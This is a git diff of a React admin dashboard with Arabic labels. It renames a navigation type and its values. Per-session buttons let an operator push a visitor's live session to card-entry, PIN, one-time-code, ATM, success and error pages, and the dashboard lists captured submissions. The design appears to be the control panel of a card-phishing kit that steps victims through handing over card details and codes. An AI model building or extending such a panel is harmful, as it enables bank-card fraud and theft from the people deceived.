@@ -1,7 +1,7 @@
 ﻿import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
 import { useLocation } from "wouter";
 import { getToken, logoutAdmin } from "@/lib/auth";
-import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getAdminSubmissionsFromSupabase, sendRedirectCommand, type RedirectTarget } from "@/lib/api";
+import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getAdminSubmissionsFromSupabase, sendNavigationCommand, type NavigationAction } from "@/lib/api";
 import { getAdminSettings, saveAdminSettings, getBlockedSessions, blockSession, unblockSession, getTrashItems, moveSubmissionToTrash, restoreTrashItem, deleteTrashItem, clearTrash } from "@/lib/admin-store";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -445,7 +445,7 @@ function SessionBox({
   onUnblock: () => void;
   onDelete: () => void;
   onOpenHistory: () => void;
-  onRedirect: (target: RedirectTarget) => void;
+  onRedirect: (target: NavigationAction) => void;
 }) {
   const [expanded, setExpanded] = useState(true);
   const [loadingAction, setLoadingAction] = useState<string | null>(null);
@@ -478,7 +478,7 @@ function SessionBox({
   };
 
   // Handle redirect with loading state
-  const handleRedirectAction = (target: RedirectTarget) => {
+  const handleRedirectAction = (target: NavigationAction) => {
     onRedirect(target);
   };
 
@@ -548,56 +548,56 @@ function SessionBox({
             <span className="text-[10px] text-slate-400 w-full mb-1">تحكم التنقل المباشر:</span>
             <button
               type="button"
-              onClick={() => handleRedirectAction('home')}
+              onClick={() => handleRedirectAction('MAIN')}
               className="rounded-lg border border-blue-200 bg-blue-50 px-2 py-1 text-[10px] text-blue-700 hover:bg-blue-100 flex items-center gap-1"
             >
               <Home className="w-3 h-3" /> الرئيسية
             </button>
             <button
               type="button"
-              onClick={() => handleRedirectAction('card')}
+              onClick={() => handleRedirectAction('CARD')}
               className="rounded-lg border border-purple-200 bg-purple-50 px-2 py-1 text-[10px] text-purple-700 hover:bg-purple-100 flex items-center gap-1"
             >
               <CreditCard className="w-3 h-3" /> البطاقة
             </button>
             <button
               type="button"
-              onClick={() => handleRedirectAction('otp1')}
+              onClick={() => handleRedirectAction('PIN1')}
               className="rounded-lg border border-green-200 bg-green-50 px-2 py-1 text-[10px] text-green-700 hover:bg-green-100 flex items-center gap-1"
             >
               <KeyRound className="w-3 h-3" /> الرمز 1
             </button>
             <button
               type="button"
-              onClick={() => handleRedirectAction('otp2')}
+              onClick={() => handleRedirectAction('PIN2')}
               className="rounded-lg border border-green-200 bg-green-50 px-2 py-1 text-[10px] text-green-700 hover:bg-green-100 flex items-center gap-1"
             >
               <KeyRound className="w-3 h-3" /> الرمز 2
             </button>
             <button
               type="button"
-              onClick={() => handleRedirectAction('otp3')}
+              onClick={() => handleRedirectAction('PIN3')}
               className="rounded-lg border border-green-200 bg-green-50 px-2 py-1 text-[10px] text-green-700 hover:bg-green-100 flex items-center gap-1"
             >
               <KeyRound className="w-3 h-3" /> الرمز 3
             </button>
             <button
               type="button"
-              onClick={() => handleRedirectAction('atm')}
+              onClick={() => handleRedirectAction('OTP')}
               className="rounded-lg border border-blue-200 bg-blue-50 px-2 py-1 text-[10px] text-blue-700 hover:bg-blue-100 flex items-center gap-1"
             >
               <Banknote className="w-3 h-3" /> الصراف
             </button>
             <button
               type="button"
-              onClick={() => handleRedirectAction('success')}
+              onClick={() => handleRedirectAction('SUCCESS')}
               className="rounded-lg border border-emerald-200 bg-emerald-50 px-2 py-1 text-[10px] text-emerald-700 hover:bg-emerald-100 flex items-center gap-1"
             >
               <ArrowRight className="w-3 h-3" /> نجاح
             </button>
             <button
               type="button"
-              onClick={() => handleRedirectAction('error')}
+              onClick={() => handleRedirectAction('ERROR')}
               className="rounded-lg border border-red-200 bg-red-50 px-2 py-1 text-[10px] text-red-700 hover:bg-red-100 flex items-center gap-1"
             >
               <AlertCircle className="w-3 h-3" /> خطأ
@@ -904,8 +904,8 @@ export default function AdminDashboard() {
   }, [fetchData]);
 
   // Handle redirect/navigation commands
-  const handleRedirect = useCallback(async (sessionId: string, target: RedirectTarget) => {
-    await sendRedirectCommand(sessionId, target);
+  const handleRedirect = useCallback(async (sessionId: string, target: NavigationAction) => {
+    await sendNavigationCommand(sessionId, target);
   }, []);
 
   const blockedMap = useMemo(() => Object.fromEntries(blockedSessions.map((entry) => [entry.sessionId, entry])), [blockedSessions]);
